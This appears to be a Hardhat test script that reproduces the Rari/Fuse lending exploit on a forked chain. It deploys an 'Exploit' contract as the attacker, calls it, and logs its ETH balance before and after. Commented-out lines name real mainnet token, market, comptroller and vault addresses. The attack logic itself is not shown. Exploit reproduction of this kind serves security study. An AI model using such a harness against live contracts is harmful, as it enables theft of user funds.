const { ethers } = require('hardhat');
const { expect } = require('chai');
const erc20_abi = require("../abi/erc20.json");
const cether_delegate_abi = require("../abi/cether_delegate.json")
const cerc20_delegate_abi = require("../abi/cerc20_delegate.json")
const comptroller_abi = require("../abi/comptroller.json")
const vault_abi = require("../abi/vault.json")

describe('[Rari Exploit]', function () {
    let someone, attacker;
    let ethBalance
    let usdcBalance

    before(async function () {
        [someone, attacker] = await ethers.getSigners();

        // this.usdc = await ethers.getContractAt(erc20_abi, '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48');   
        // this.fEth = await ethers.getContractAt(cether_delegate_abi, '0x26267e41CeCa7C8E0f143554Af707336f27Fa051');   
        // this.fUsdc = await ethers.getContractAt(cerc20_delegate_abi, '0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47')
        // this.comptroller = await ethers.getContractAt(comptroller_abi, '0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F')
        // this.vault = await ethers.getContractAt(vault_abi, '0xBA12222222228d8Ba445958a75a0704d566BF2C8')

        const factory = await ethers.getContractFactory("Exploit", attacker);
        this.exploit = await factory.deploy()
        await this.exploit.deployed();

        await attacker.sendTransaction({
            to: someone.address,
            value: ethers.utils.parseUnits("9990", 18) 
        });

        ethBalance = await ethers.provider.getBalance(this.exploit.address);
        console.log("before test ETH balance", ethers.utils.formatUnits(ethBalance), 18);
        
        // expect(
        //     await this.token.balanceOf(attacker.address)
        // ).to.equal('0');
 
    });

    
    it('Exploit', async function () {
        await this.exploit.connect(attacker).exploit();
    });

    after(async function () {
        ethBalance = await ethers.provider.getBalance(this.exploit.address);
        console.log("after test ETH balance", ethers.utils.formatUnits(ethBalance), 18);
    });
});